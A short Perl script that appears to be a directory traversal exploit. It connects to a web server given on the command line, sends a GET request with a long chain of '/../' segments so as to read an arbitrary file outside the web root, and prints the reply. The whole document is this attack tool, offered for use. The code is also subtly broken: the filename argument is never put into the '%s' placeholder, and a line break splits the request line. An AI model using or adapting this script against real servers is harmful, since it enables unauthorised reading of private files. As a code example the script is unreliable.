#!/usr/bin/perl
use IO::Socket;
$pkt = "GET /../../../../../../../../../../../../../../../../../../../../%s
HTTP/1.0\r\n\r\n";
if (@ARGV < 2 || @ARGV > 3) {
print STDOUT "Usage: perl $0 [filename] [host] [port=80]";
exit;
}
if (@ARGV==3) {
$port=$ARGV[2];
} else {
$port=80;
}
$f = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$ARGV[1],PeerPort=>$port);
if (!defined($f)) {
$err=sprintf("Cannot connect to %s on port %d",$ARGV[1],$port);
print STDOUT $err;
exit;
}
$f->autoflush(1);
print $f $pkt;
while (defined($line = <$f>)) {
print STDOUT $line;
}
undef $f;